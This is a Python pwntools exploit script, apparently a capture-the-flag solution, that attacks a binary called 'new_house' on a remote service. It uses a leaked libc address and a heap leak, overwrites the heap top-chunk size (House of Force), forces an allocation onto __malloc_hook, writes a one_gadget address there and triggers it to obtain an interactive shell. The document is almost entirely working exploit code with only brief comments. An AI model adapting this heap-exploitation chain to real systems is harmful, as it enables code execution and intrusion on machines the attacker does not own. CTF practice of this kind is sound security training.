#!/usr/bin/env python3

from pwn import *

exe = ELF("./new_house")
libc = ELF("./libc.so.6")

context.binary = exe

# p = process("./new_house")
# gdb.attach(p)

p = remote("flu.xxx", 10170)

p.recvuntil(b"interesting in the ground: ")
libc.address = int(p.recvline().decode().strip(),16)
one_gadget_empty_rsp30 = libc.address + 0x40e8a # if malloc_hook overwrite
malloc_hook = libc.address + 0x3aabf0

log.success(f"{hex(libc.address)=}")
log.success(f"{hex(one_gadget_empty_rsp30)=}")
log.success(f"{hex(malloc_hook)=}")

p.recvuntil(b">>> ")
p.sendline(b"1")
p.recvuntil(b"roomname? ")
p.sendline(b"A"*16)
p.recvuntil(b"roomsize? ")
p.sendline(str(0x100).encode())

p.recvuntil(b">>> ")
p.sendline(b"4")
p.recvuntil(b"A"*16)
heap_leak = u64(p.recvline()[:4].ljust(8,b"\x00"))
log.success(f"{hex(heap_leak)=}")

p.recvuntil(b">>> ")
p.sendline(b"2")
p.recvuntil(b"roomnumber? ")
p.sendline(b"0")

p.recvuntil(b">>> ")
p.sendline(b"1")
p.recvuntil(b"roomname? ")
p.sendline(b"B"*4)
p.recvuntil(b"roomsize? ")
p.sendline(str(0x10).encode())

p.recvuntil(b">>> ")
p.sendline(b"3")
p.recvuntil(b"roomnumber? ")
p.sendline(b"0")
p.recvuntil(b"What goes into the room? ")
p.sendline(b"B"*24 + b"\xff"*8) # set top chunk size to 0xffffffff

distance = malloc_hook - heap_leak - 0x30

p.recvuntil(b">>> ")
p.sendline(b"1")
p.recvuntil(b"roomname? ")
p.sendline(b"C"*4)
p.recvuntil(b"roomsize? ")
p.sendline(str(distance).encode())

p.recvuntil(b">>> ") # returns pointer to malloc hook
p.sendline(b"1")
p.recvuntil(b"roomname? ")
p.sendline(b"D"*4)
p.recvuntil(b"roomsize? ")
p.sendline(str(0x10).encode())

p.recvuntil(b">>> ")
p.sendline(b"3")
p.recvuntil(b"roomnumber? ")
p.sendline(b"3")
p.recvuntil(b"What goes into the room? ")
p.sendline(p64(one_gadget_empty_rsp30))

p.recvuntil(b">>> ") # call malloc hook
p.sendline(b"1")
p.recvuntil(b"roomname? ")
p.sendline(b"C"*4)
p.recvuntil(b"roomsize? ")
p.sendline(str(distance).encode())

p.interactive()
